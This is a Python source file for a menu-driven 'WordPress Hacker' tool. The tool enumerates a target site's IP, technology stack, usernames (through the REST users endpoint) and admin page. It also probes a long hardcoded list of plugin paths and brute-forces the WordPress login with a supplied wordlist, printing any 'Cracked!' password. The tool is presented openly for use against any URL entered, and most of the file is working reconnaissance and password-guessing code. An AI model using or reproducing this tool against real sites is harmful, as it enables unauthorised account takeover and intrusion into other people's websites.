import os, random, time, socket, sys, requests, builtwith, json, urllib.parse

RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
Headers = {
    'Accept':'*/*',
    'Content-Type':'application/x-www-form-urlencoded',
    'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
}

def Print_Logo():
    Colors = ['\033[31m', '\033[32m', '\033[33m', '\033[34m', '\033[35m', '\033[36m', '\033[37m', '\033[39m']
    Logo = '''

                __          __           _ _____                   
                \ \        / /          | |  __ \                  
                 \ \  /\  / /__  _ __ __| | |__) | __ ___  ___ ___ 
                  \ \/  \/ / _ \| '__/ _` |  ___/ '__/ _ \/ __/ __|
                   \  /\  / (_) | | | (_| | |   | | |  __/\__ \__ \\
                    \/  \/ \___/|_|  \__,_|_|   |_|  \___||___/___/

                         '''+YELLOW+'''+'''+GREEN+'''----------------------------'''+YELLOW+'''+      
                         '''+YELLOW+'''+  '''+CYAN+'''Programmer'''+BLUE+''': '''+MAGENTA+'''.::Shayan::.  '''+YELLOW+'''+
                         '''+YELLOW+'''+    '''+CYAN+'''Developer'''+BLUE+''':  '''+MAGENTA+'''ZetaTech    '''+YELLOW+'''+
                         '''+YELLOW+'''+   '''+CYAN+'''Telegram'''+BLUE+''': '''+MAGENTA+'''@ZetaTech_iR   '''+YELLOW+'''+
                         '''+YELLOW+'''+'''+GREEN+'''----------------------------'''+YELLOW+'''+
                            _    _            _     
                           | |  | |          | |            
                           | |__| | __ _  ___| | _____ _ __ 
                           |  __  |/ _` |/ __| |/ / _ \ '__|
                           | |  | | (_| | (__|   <  __/ |   
                           |_|  |_|\__,_|\___|_|\_\___|_|   

                                 '''+GREEN+'''['''+MAGENTA+'''*'''+GREEN+''']'''+YELLOW+'''Choose An Option '''+WHITE+''':

              '''+GREEN+'''['''+MAGENTA+'''1'''+GREEN+''']'''+YELLOW+'''Get Information | '''+GREEN+'''['''+MAGENTA+'''2'''+GREEN+''']'''+YELLOW+'''Plugin Grabber | '''+GREEN+'''['''+MAGENTA+'''3'''+GREEN+''']'''+YELLOW+'''Brute Forcer
                                      '''+GREEN+'''['''+MAGENTA+'''0'''+GREEN+''']'''+YELLOW+'''Exit'''
    for Line in Logo.split('\n'):
        time.sleep(0.1)
        print(random.choice(Colors)+Line)

def Clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def Main():
    Clear()
    Print_Logo()
    op = input(GREEN+'                 > '+YELLOW)
    if op != '':
        if int(op) <= 3:
            if int(op) == 1:
                Clear()
                Get_Infomation()
            elif int(op) == 2:
                Clear()
                Plugin_Grabber()
            elif int(op) == 3:
                Clear()
                BruteForcer()
            else:
                sys.exit(0)
        else:
            pass
    else:
        pass

def UrlTools(Url):
    if Url.lower().startswith('https://') or Url.lower().startswith('http://'):
        Url = Url.replace('http://','').replace('https://','')
    return Url

def Upper(Word):
    Worrd = ''
    sp = Word.split(' ')
    Count = len(sp)
    for W in sp:

        Worrd += W.title()+' '
def Info(Url):
    B = builtwith.parse(Url)
    Last = ''
    for N in B:
        Last = N
    Info = ''
    Count = 0
    for Name in B:
        Count = len(B[Name]) -1
        Values = ''
        for Value in B[Name]:
            Split = BLUE+' | '+MAGENTA
            if Value == B[Name][Count]:
                Split = ''
            Values += Value+Split
        if Name == Last:
            Info += '         '+CYAN+'['+WHITE+'+'+CYAN+']'+YELLOW+Name.replace('-','').title()+GREEN+': '+MAGENTA+Values
        else:
            Info += '         '+CYAN+'['+WHITE+'+'+CYAN+']'+YELLOW+Name.replace('-',' ').title()+GREEN+': '+MAGENTA+Values+WHITE+'\n'

    return Info

def GetUsername(Url):
    r = requests.get(Url+'/wp-json/wp/v2/users/',headers=Headers).text
    j = json.loads(r)
    Count = len(j) - 1
    cn = 0
    User = ''
    for Val in j:
        Split = '\n'
        if Count == cn:
            Split = ''
        U = j[cn]['slug']
        if not U == '':
            User += '         '+CYAN+'['+WHITE+'+'+CYAN+'] '+YELLOW+U+Split
        cn += 1
    if User == '':
        User = RED+'Not Found!'
    return User

def AdminPage(Url):
    r = requests.get(Url+'/wp-admin',allow_redirects=False)
    AdminPageuRL = ''
    if r.status_code == 200:
        AdminPageuRL = RED+'Not Found!'
    elif r.status_code == 301:
        AdminPageuRL = MAGENTA+Url+'/wp-admin'
    return AdminPageuRL
def Get_Infomation():
    print('\n\n '+YELLOW+'['+GREEN+'!'+YELLOW+']'+BLUE+'Please Enter The Target Url\n')
    Target = input(MAGENTA+'  > '+GREEN)
    Url = UrlTools(Target).title()
    Ip = '      '+CYAN+'['+WHITE+'+'+CYAN+']'+YELLOW+'Ip'+MAGENTA+socket.gethostbyname(Url)
    Infor = '      '+CYAN+'['+WHITE+'+'+CYAN+']'+YELLOW+'Information'+GREEN+': \n'+Info('http://'+Url)
    UserName = '      '+CYAN+'['+WHITE+'+'+CYAN+']'+YELLOW+'Usernames'+GREEN+': \n'+GetUsername('http://'+Url)
    AdminPageUrl = '      '+CYAN+'['+WHITE+'+'+CYAN+']'+YELLOW+'Admin Page'+GREEN+': '+AdminPage('http://'+Url)
    Url = '   '+CYAN+'['+WHITE+'*'+CYAN+']'+YELLOW+'Target'+GREEN+': '+MAGENTA+'http://'+Url
    print('\n\n'+Url+'\n'+Infor+'\n'+UserName+'\n'+AdminPageUrl+'\n')
    input('\n\n\n'+GREEN+'Finished!'+'\n'+GREEN+'Press '+'`'+MAGENTA+'Enter'+GREEN+'` To Continue'+GREEN+'...')
    Main()


def Plugin_Grabber():
    Plugins = 'starbox|code-snippets|contact-form-7-honeypot|genesis-layout-extras|wp-google-fonts|wp-statistics|gtranslate|wp-all-import|stop-spammer-registrations-plugin|multiple-post-thumbnails|vipers-video-quicktags|bm-custom-login|rotatingtweets|yith-maintenance-mode|webriti-smtp-mail|wp-shortcode|yith-woocommerce-compare|keycaptcha|social-count-plus|flickr-rss|cachify|advertising-manager|shareaholic|login-security-solution|mail-subscribe-list|cms-tree-page-view|wp-super-cache|ag-custom-admin|paypal-donations|metronet-reorder-posts|velvet-blues-update-urls|pixcodes|wp-youtube-lyte|wp-mobile-detect|easy-coming-soon|wordpress-23-related-posts-plugin|fruitful-shortcodes|italy-cookie-choices|wp-mail-bank|photo-gallery|simple-login-log|easy-columns|squirrly-seo|simple-backup|theme-my-login|verify-google-webmaster-tools|recent-posts-widget-with-thumbnails|regenerate-thumbnails|really-simple-captcha|master-slider|simple-image-widget|dynamic-widgets|nofollow-for-external-link|lightweight-social-icons|backup-with-restore|display-posts-shortcode|post-type-switcher|easy-digital-downloads|advanced-random-posts-widget|get-the-image|download-monitor|facebook-page-promoter-lightbox|wp-google-analytics|wp-polls|siteguard|youtube-channel-gallery|wowslider|recent-facebook-posts|flare|wysiwyg-widgets|wp-facebook-open-graph-protocol|capability-manager-enhanced|gallery-bank|custom-facebook-feed|special-recent-posts|font-awesome-4-menus|menu-image|wp-site-migrate|woocommerce-product-archive-customiser|welcome-email-editor|google-language-translator|easy-twitter-feed-widget|wp-postratings|add-to-any|ajax-event-calendar|ps-auto-sitemap|pinterest-pin-it-button-for-images|jquery-t-countdown-widget|instagram-for-wordpress|lightbox-plus|auto-terms-of-service-and-privacy-policy|ewww-image-optimizer|backwpup|updraftplus|tweetthis|commentluv|uji-countdown|custom-sidebars|option-tree|co-authors-plus|q2w3-fixed-widget|wp-hide-post|enhanced-media-library|slider-image|wp-maintenance-mode|wp-insert|stats-counter|accesspress-custom-css|aqua-page-builder|post-snippets|custom-menu-wizard|genesis-connect-woocommerce|pagerestrict|seo-facebook-comments|akismet|tiled-gallery-carousel-without-jetpack|crazy-bone|clone-posts|wp-share-buttons-analytics-by-getsocial|genesis-title-toggle|google-document-embedder|contact-form-to-email|json-api|email-subscribers|popups|extended-categories-widget|disable-google-fonts|kimili-flash-embed|wpfront-scroll-top|social-profiles-widget|wplegalpages|column-shortcodes|wpfront-user-role-editor|wp-admin-bar-removal|bad-behavior|player|wp-content-copy-protector|pushpress|templatesnext-toolkit|ultimate-tinymce|slideshow-gallery|responsive-menu|mainwp-child|woocommerce-colors|advanced-iframe|shortcodes-ultimate|flexi-quote-rotator|wpmandrill|woocommerce-pdf-invoices-packing-slips|new-google-plus-badge-widget|nk-google-analytics|twitter-facebook-google-plusone-share|wordpress-access-control|wp-simple-firewall|menu-icons|svg-vector-icon-plugin|wp-bannerize|content-aware-sidebars|rss-post-importer|yith-woocommerce-zoom-magnifier|portfolio-slideshow|wp-better-emails|embed-any-document|simple-image-sizes|seo-redirection|google-maps|better-analytics|advanced-access-manager|seo-image|remove-category-url|super-rss-reader|rating-widget|amazon-web-services|accesspress-social-share|flexi-pages-widget|related-posts|white-label-cms|multi-device-switcher|sexybookmarks|udinra-all-image-sitemap|wp-hide-dashboard|alexa-internet|what-the-file|wp-retina-2x|simple-history|xml-sitemaps|ozh-admin-drop-down-menu|cms-commander-client|feedburner-plugin|wp-video-lightbox|advanced-excerpt|wp-email-login|simple-custom-css|wc-shortcodes|wp-jquery-lightbox|easy-wp-smtp|wp-smushit|brute-force-login-protection|bootstrap-shortcodes|transposh-translation-filter-for-wordpress|wordpress-ping-optimizer|wp-email|ultimate-maintenance-mode|hyper-cache|multi-plugin-installer|woosidebars|social|types|weaver-ii-theme-extras|custom-content-type-manager|vaultpress|lj-maintenance-mode|tabby-responsive-tabs|seo-automatic-links|add-local-avatar|widget-logic|easy-theme-and-plugin-upgrades|bulletproof-security|contact-form-plugin|soundcloud-is-gold|awesome-weather|simple-google-analytics|tinymce-advanced|useful-banner-manager|categories-images|live-composer-page-builder|addthis|alpine-photo-tile-for-instagram|html-sitemap|yith-woocommerce-ajax-search|wp-clean-up|responsive-lightbox-lite|wp-smtp|drafts-scheduler|loco-translate|widget-css-classes|ckeditor-for-wordpress|hide-admin-bar-from-non-admins|codepeople-post-map|php-text-widget|remove-dashboard-access-for-non-admins|buddypress-media|jetpack|ga-google-analytics|wp-edit|one-click-close-comments|wordpress-simple-paypal-shopping-cart|video-embed-thumbnail-generator|wordpress-database-reset|force-regenerate-thumbnails|beaver-builder-lite-version|php-code-for-posts|all-404-redirect-to-homepage|ad-injection|cornerstone|wpclef|json-rest-api|flash-album-gallery|orbisius-child-theme-creator|custom-post-type-permalinks|baw-post-views-count|duracelltomi-google-tag-manager|horizontal-scrolling-announcement|backupwordpress|megamenu|google-author-link|shortcoder|byrev-wp-picshield-hotlink-defence|wp-easy-gallery|comprehensive-google-map-plugin|event-organiser|collapsing-categories|smart-youtube|easy-fancybox|custom-post-widget|easy-testimonials|profile-builder|insert-headers-and-footers|google-universal-analytics|widget-settings-importexport|youtube-embed|ajax-thumbnail-rebuild|wp-sitemap-page|woocommerce|wp-to-twitter|wp-security-audit-log|schema-creator|wp-job-manager-locations|mailchimp-for-wp|sidekick|wp-product-review|ultimate-under-construction|compact-wp-audio-player|videojs-html5-video-player-for-wordpress|post-thumbnail-editor|wp-user-avatar|yith-woocommerce-ajax-navigation|wordpress-importer|call-now-button|easy-pie-maintenance-mode|wp-spamshield|share-this|wp-lightbox-2|wp-add-custom-css|itro-popup|kebo-twitter-feed|rename-wp-login|wordtwit|broken-link-checker|faster-pagination|addthis-follow|woocommerce-csvimport|wp-socializer|clean-and-simple-contact-form-by-meg-nicholas|easy-google-fonts|hide-admin-bar|nextgen-gallery-optimizer|captcha-on-login|email-users|wp-google-maps|simple-page-ordering|css-javascript-toolbox|wp-security-scan|custom-contact-forms|lightbox|gantry|easing-slider|social-locker|wp-htaccess-editor|feed-them-social|super-socializer|role-scoper|black-studio-tinymce-widget|wp-pro-quiz|wp-tab-widget|featured-video-plus|simple-page-sidebars|add-meta-tags|facebook-conversion-pixel|wp-super-cache-clear-cache-menu|cookie-notice|block-bad-queries|xcloner-backup-and-restore|simple-google-map|404-to-start|spam-free-wordpress|title-remover|yikes-inc-easy-mailchimp-extender|sitemap|admin-menu-editor|advanced-post-slider|stealth-login-page|rss-includes-pages|wassup|woocommerce-delivery-notes|ultimate-responsive-image-slider|simple-social-buttons|header-and-footer-scripts|advanced-responsive-video-embedder|stop-spam-comments|open-external-links-in-a-new-window|polldaddy|feedburner-form|wptouch|tac|media-library-assistant|wp-favorite-posts|imsanity|store-locator-le|wordpress-social-login|pods|wp-pagenavi-style|growmap-anti-spambot-plugin|seo-ultimate|scroll-back-to-top|maintenance|global-content-blocks|gallery-plugin|editorial-calendar|wp-photo-album-plus|redux-framework|contact-form-7-dynamic-text-extension|meta-box|wp-members|social-media-feather|recent-posts-widget-extended|instagram-image-gallery|blogger-importer|wp-admin-ui-customize|dropbox-backup|ricg-responsive-images|simple-301-redirects|breadcrumb-trail|easy-image-gallery|foobox-image-lightbox|google-publisher|cleantalk-spam-protect|logo-slider|gzip-ninja-speed-compression|spider-event-calendar|wp-updates-notifier|cryptx|google-analyticator|nextend-facebook-connect|wp-construction-mode|adrotate|optinmonster|mce-table-buttons|email-address-encoder|genesis-favicon-uploader|genesis-slider|usc-e-shop|disable-feeds|video-playlist-and-gallery-plugin|crayon-syntax-highlighter|add-from-server|jquery-collapse-o-matic|ps-disable-auto-formatting|ssh-sftp-updater-support|wp-optimize|meta-manager|custom-field-suite|wp-noexternallinks|wp-twitter-feeds|saphali-woocommerce-lite|advanced-text-widget|landing-pages|google-calendar-events|wp-db-backup|user-submitted-posts|simple-ads-manager|exploit-scanner|wordpress-popup|gravity-forms|gravity-forms-custom-post-types|oauth-twitter-feed-for-developers|nospamnx|google-analytics-dashboard-for-wp|post-tags-and-categories-for-pages|booking|theme-junkie-custom-css|relevanssi|wp-visual-icon-fonts|google-maps-widget|audit-trail|better-delete-revision|backup-wp|google-analytics-for-wordpress|instagram-feed|mechanic-visitor-counter|paid-memberships-pro|quotes-collection|custom-login|easy-smooth-scroll-links|accesspress-social-counter|wordpress-move|addquicktag|hide-my-site|business-directory-plugin|dynamic-featured-image|pinterest-pin-it-button|antivirus|persian-woocommerce|user-access-manager|google-sitemap-plugin|dropdown-menu-widget|resize-image-after-upload|all-in-one-wp-migration|wordpress-easy-paypal-payment-or-donation-accept-plugin|wc-gallery|use-any-font|lockdown-wp-admin|simple-lightbox|header-footer|hc-custom-wp-admin-url|user-photo|soundcloud-shortcode|mappress-google-maps-for-wordpress|smk-sidebar-generator|baw-login-logout-menu|nextgen-scrollgallery|ecwid-shopping-cart|nextgen-gallery|slideshow-jquery-image-gallery|contact-form-7-to-database-extension|powerpress|antispam-bee|fancy-box|genesis-enews-extended|leverage-browser-caching-ninjas|uk-cookie-consent|secure-wordpress|bulk-delete|autoptimize|wp-author-date-and-meta-remover|stops-core-theme-and-plugin-updates|contact-form-email|no-page-comment|disable-xml-rpc-pingback|synved-shortcodes|image-widget|advanced-sidebar-menu|email-before-download|gregs-high-performance-seo|contextual-related-posts|wp-rss-aggregator|wp-customer-reviews|like-box|edit-author-slug|hide-title|multiple-content-blocks|nextcellent-gallery-nextgen-legacy|slimjetpack|asesor-cookies-para-la-ley-en-espana|sg-cachepress|yith-woocommerce-wishlist|youtube-embed-plus|improved-include-page|any-mobile-theme-switcher|coming-soon|simply-exclude|login-customizer|tubepress|magic-fields-2|admin-post-navigation|peters-login-redirect|wunderground|twitter-plugin|groups|easy-video-player|formbuilder|wp-math-captcha|kiwi-logo-carousel|lightbox-gallery|contact-bank|quick-cache|raw-html|statify|zero-spam|tumblr-importer|simple-map|postman-smtp|custom-field-template|disable-emojis|link-library|contact-form-7-datepicker|widget-shortcode|background-manager|accesspress-social-icons|my-calendar|rvg-optimize-database|enable-media-replace|woocommerce-custom-product-tabs-lite|nextgen-facebook|404-to-301|wordpress-seo|juiz-social-post-sharer|twitter-widget-pro|worker|all-in-one-schemaorg-rich-snippets|youtube-channel|pixtypes|woocommerce-exporter|child-theme-configurator|easy-media-gallery|olevmedia-shortcodes|facebook-button-plugin|easy-pricing-tables|genesis-responsive-slider|opml-importer|slickr-flickr|bwp-google-xml-sitemaps|disable-wordpress-updates|amazon-s3-and-cloudfront|coming-soon-page|portfolio-gallery|page-links-to|tweet-old-post|cookie-law-info|cloudflare|remove-query-strings-from-static-resources|all-in-one-wp-security-and-firewall|social-sharing-toolkit|wp-dbmanager|virtue-toolkit|eig-sso|foogallery|custom-share-buttons-with-floating-sidebar|smart-slider-2|custom-permalinks|w3-total-cache|latest-tweets-widget|ultimate-social-media-icons|site-is-offline-plugin|easy-social-icons|woocommerce-admin-bar-addition|wordpress-popular-posts|kk-star-ratings|so-css|password-protect-wordpress|gotmls|fonts|simple-sitemap|seamless-donations|woocommerce-grid-list-toggle|adsense-plugin|uber-login-logo|amr-shortcode-any-widget|twitter-tools|homepage-control|wpgform|heartbeat-control|debug-bar|googleanalytics|cleaner-gallery|bwp-recaptcha|wpremote|wp-total-hacks|woocommerce-all-in-one-seo-pack|embedplus-for-wordpress|iwp-client|gwolle-gb|wp-migrate-db|social-networks-auto-poster-facebook-twitter-g|custom-post-type-ui|testimonial-rotator|the-events-calendar|tablepress|advanced-image-styles|all-in-one-seo-pack|maxbuttons|official-statcounter-plugin-for-wordpress|ditty-news-ticker|facebook-auto-publish|so-widgets-bundle|all-in-one-event-calendar|top-10|cyr3lat|bbpress|genesis-translations|ad-widget|woocommerce-customizer|wp-sendgrid|export-users-to-csv|fancy-gallery|soliloquy-lite|wp-postviews|tw-recent-posts-widget|flexible-posts-widget|one-click-child-theme|portfolio-post-type|reveal-ids-for-wp-admin-25|lazy-load|easy-watermark|wordpress-backup-to-dropbox|formget-contact-form|facebook-pagelike-widget|wp-editor|simple-share-buttons-adder|revision-control|acf-field-date-time-picker|woocommerce-google-analytics-integration|toggle-the-title|post-types-order|woocommerce-menu-bar-cart|crazyegg-heatmap-tracking|facebook|rus-to-lat-advanced|better-wp-security|members|wordpress-mobile-pack|csv-importer|buddypress|attachments|nimble-portfolio|wp-job-manager|contact-form-7|wp-media-library-categories|wps-hide-login|adminimize|google-analytics-dashboard|woocommerce-pagseguro|image-watermark|google-maps-builder|syntaxhighlighter|slider-wd|ninja-forms|wp-job-manager-contact-listing|easy-pie-coming-soon|calculated-fields-form|wp-memory-usage|safe-redirect-manager|simple-social-icons|facebook-like-box-widget|mashsharer|subscribe-to-comments-reloaded|easy-modal|category-posts|cimy-user-extra-fields|password-protected|wp-review|contact-form-maker|contact-form-7-recaptcha-extension|speed-booster-pack|nofollow-links|wysija-newsletters|aweber-web-form-widget|paypal-for-woocommerce|advanced-wp-columns|qtranslate-slug|nofollow|google-captcha|captcha|bootstrap-3-shortcodes|restricted-site-access|wp-useronline|breadcrumb-navxt|xml-sitemap-feed|yet-another-related-posts-plugin|form-maker|simple-follow-me-social-buttons-widget|insert-php|wp-stats|google|posts-in-page|underconstruction|email-encoder-bundle|simple-tags|revslider|fourteen-colors|display-widgets|mw-wp-form|nginx-helper|custom-favicon|new-user-approve|easy-adsense-lite|jquery-pin-it-button-for-images|facebook-members|html-javascript-adder|manual-image-crop|iq-block-country|sidebar-login|bulk-page-creator|bwp-minify|woocommerce-checkout-manager|showcase-visual-composer-addon|ultimate-tag-cloud-widget|simple-slider-ssp|twitter|flickr-badges-widget|codepress-admin-columns|wp-clone-by-wp-academy|si-contact-form|wp-e-commerce|user-switching|eu-cookie-law|mythemeshop-connect|thesis-openhook|taxonomy-images|gigpress|options-framework|nav-menu-images|wufoo-shortcode|subscribe-to-comments|mp3-jplayer|easy-social-share-buttons|use-google-libraries|yop-poll|wp-gallery-custom-links|easy-table|fancybox-for-wordpress|posts-to-posts|easy-facebook-likebox|php-code-widget|widget-contact-form-7|testimonials-widget|sucuri-scanner|adminer|trust-form|s2member|insert-html-snippet|floating-social-media-icon|bruteprotect|wp-content-copy-protection|flamingo|font|wp125|child-themify|wp-jalali|go-live-update-urls|wpcat2tag-importer|sem-external-links|all-in-one-webmaster|p3-profiler|zopim-live-chat|google-plus-authorship|baidu-sitemap-generator|printfriendly|rss-import|facebook-by-weblizar|movabletype-importer|visitor-maps|hello-dolly|pirate-forms|social-media-icons-widget|wpide|postie|widgetize-pages-light|simple-wp-sitemap|cardoza-facebook-like-box|vanilla-pdf-embed|testimonials-by-woothemes|001-prime-strategy-translate-accelerator|disqus-comment-system|job-manager|post-type-archive-links|features-by-woothemes|wp-filebase|duplicator|infolinks-officlial-plugin|calendar|wp-print|smooth-slider|wp-sticky|social-media-widget|wp-slimstat|login-with-ajax|content-views-query-and-display-post-page|simple-twitter-tweets|forget-about-shortcode-buttons|video-thumbnails|advanced-custom-fields|wp-fail2ban|wp-database-backup|simple-maintenance-mode|better-font-awesome|my-custom-css|newsletter|genesis-simple-sidebars|facebook-comments-plugin|si-captcha-for-wordpress|widget-importer-exporter|favicon-rotator|wordpress-language|jquery-smooth-scroll|dw-question-answer|visual-form-builder|wp-fastest-cache|nav-menu-roles|no-comments|wp-paginate|wp-subscribe|disable-comments|table-of-contents-plus|head-cleaner|search-regex|gallery-video|google-sitemap-generator|woocommerce-sequential-order-numbers|wordpress-social-ring|anti-spam|events-manager|really-simple-csv-importer|wordpress-reset|hupso-share-buttons-for-twitter-facebook-google|another-wordpress-classifieds-plugin|google-xml-sitemaps-v3-for-qtranslate|dirtysuds-embed-pdf|grand-media|cta|search-everything|taxonomy-metadata|wonderm00ns-simple-facebook-open-graph-tags|easy-bootstrap-shortcodes|wp-social-bookmarking-light|formidable|wp-instagram-widget|iframe|genesis-simple-edits|floating-social-bar|magic-action-box|newpost-catch|leaflet-maps-marker|404-redirection|wp-crontrol|post-duplicator|list-category-posts|widget-context|footer-putter|wordpress-form-manager|eps-301-redirects|simply-instagram|popup-maker|wp-multibyte-patch|wordpress-post-tabs|ultimate-coming-soon-page|wp-piwik|edit-flow|disable-xml-rpc|genesis-simple-hooks|mailchimp-forms-by-mailmunch|wp-live-chat-support|click-to-tweet-by-todaymade|wp-copyprotect|meteor-slides|simple-custom-post-order|post-expirator|woocommerce-multilingual|responsive-select-menu|responsive-photo-gallery|zencache|search-meter|varnish-http-purge|ml-slider|image-slider-widget|pubsubhubbub|enhanced-text-widget|ifeature-slider|user-role-editor|duplicate-post|instagram-slider-widget|favicon-by-realfavicongenerator|tiny-compress-images|newsletter-sign-up|wp-responsive-menu|ultimate-posts-widget|wp-pagenavi|pricing-table|gallery-images|acurax-social-media-widget|aryo-activity-log|google-authenticator|simple-facebook-plugin|redirection|rich-text-tags|woocommerce-jetpack|add-logo-to-admin|youtube-widget-responsive|clicky|only-tweet-like-share-and-google-1|rss-footer|duplicate-menu|menu-social-icons|cpt-bootstrap-carousel|simple-full-screen-background-image|wp-ban|fv-wordpress-flowplayer|wp-google-map-plugin|fv-top-level-cats|basic-google-maps-placemarks|wp-htaccess-control|siteorigin-panels|bj-lazy-load|easy-sign-up|wp-recaptcha|related-posts-by-zemanta|quick-pagepost-redirect-plugin|jquery-updater|recent-tweets-widget|contact-form-builder|video-sidebar-widgets|newstatpress|admin-management-xtended|advanced-code-editor|page-scroll-to-id|polylang|columns|ad-inserter|cookies-for-comments|under-construction-wp|delete-all-comments|carousel-without-jetpack|wp-missed-schedule|pdf-embedder|admin-menu-tree-page-view|erident-custom-login-and-dashboard|sumome|feedwordpress|taxonomy-terms-order|wordfence|ultimate-member|woocommerce-poor-guys-swiss-knife|strictly-autotags|wangguard|styles|responsive-lightbox|page-list|oa-social-login|addthis-smart-layers|login-lockdown|envira-gallery-lite|better-search-replace|rss-importer|wp-external-links|wp-mail-smtp|qtranslate-x|intuitive-custom-post-order|pretty-link|sharebar|alo-easymail|magic-fields|wp-flexible-map|download-manager|theme-check|cyclone-slider-2'.split('|')
    print('\n\n '+YELLOW+'['+GREEN+'!'+YELLOW+']'+BLUE+'Please Enter The Target Url\n')
    Target = input(MAGENTA+'  > '+GREEN)
    Url = UrlTools(Target)
    print('\n\n')
    print('   '+YELLOW+'['+CYAN+'*'+YELLOW+']'+MAGENTA+'Target'+WHITE+': '+GREEN+Url)
    for Plug in Plugins:
        try:
            r = requests.get('http://'+Url+'/wp-content/plugins/'+Plug,headers=Headers)
            if r.status_code == 200:
                print('      '+YELLOW+'['+CYAN+'+'+YELLOW+']'+MAGENTA+'http://'+Url+'/wp-content/plugins/'+Plug+WHITE+' -> '+GREEN+'Is Available!')
                continue
            else:
                print('      '+YELLOW+'['+CYAN+'-'+YELLOW+']'+MAGENTA+'http://'+Url+'/wp-content/plugins/'+Plug+WHITE+' -> '+RED+'Is Not Available!')
                continue
        except KeyboardInterrupt:
            break
        else:
            print('      '+YELLOW+'['+CYAN+'-'+YELLOW+']'+MAGENTA+'http://'+Url+'/wp-content/plugins/'+Plug+WHITE+' -> '+RED+'Is Not Available!')
            continue
    input('\n\n\n'+GREEN+'Finished!'+'\n'+GREEN+'Press '+'`'+MAGENTA+'Enter'+GREEN+'` To Continue'+WHITE+'...')
    Main()

def BruteForcer():
    print('\n\n '+YELLOW+'['+GREEN+'!'+YELLOW+']'+BLUE+'Please Enter The Target Url\n')
    Target = input(MAGENTA+'  > '+GREEN)
    Url = UrlTools(Target)
    print('\n')
    print(' '+YELLOW+'['+GREEN+'!'+YELLOW+']'+BLUE+'Please Enter The Target Username\n')
    Username = input(MAGENTA+'  > '+GREEN)
    print('\n')
    print(' '+YELLOW+'['+GREEN+'!'+YELLOW+']'+BLUE+'Please Enter The Wordlist\n')
    Passowrds = input(MAGENTA+'  > '+GREEN)
    print('\n\n')
    Passowrds = open(Passowrds,'r').read().splitlines()
    print('   '+YELLOW+'['+CYAN+'*'+YELLOW+']'+MAGENTA+'Target'+WHITE+': '+GREEN+Url)
    for Pass in Passowrds:
        try:
            Payload ={
                'log':Username,
                'pwd':Pass,
                'wp-submit':'ورود',
                'redirect_to':'http://'+Url+'/wp-admin/',
                'testcookie':1
            }
            r = requests.post('http://'+Url,data=Payload,headers=Headers)
            c = str(r.cookies)
            if 'wordpress_logged_in_' in c:
                print('      '+YELLOW+'['+GREEN+'+'+YELLOW+']'+MAGENTA+'Target'+WHITE+': '+RED+Url+WHITE+' -> '+GREEN+'Cracked!')
                print('         '+YELLOW+'['+GREEN+'~'+YELLOW+']'+MAGENTA+'Login Page'+WHITE+': '+GREEN+Url)
                print('         '+YELLOW+'['+GREEN+'~'+YELLOW+']'+MAGENTA+'Username'+WHITE+': '+GREEN+Username)
                print('         '+YELLOW+'['+GREEN+'~'+YELLOW+']'+MAGENTA+'Password'+WHITE+': '+GREEN+Pass)
                break
            else:
                print('      '+YELLOW+'['+RED+'-'+YELLOW+']'+MAGENTA+'Target'+WHITE+': '+RED+Url+WHITE+' -> '+RED+' Not Cracked!')
                continue
        except KeyboardInterrupt:
            break
        else:
            print('      '+YELLOW+'['+RED+'-'+YELLOW+']'+MAGENTA+'Target'+WHITE+': '+RED+Url+WHITE+' -> '+RED+' Not Cracked!')
            continue
    input('\n\n\n'+GREEN+'Finished!'+'\n'+GREEN+'Press '+'`'+MAGENTA+'Enter'+GREEN+'` To Continue'+WHITE+'...')
    Main()
          
while True:
    Main()
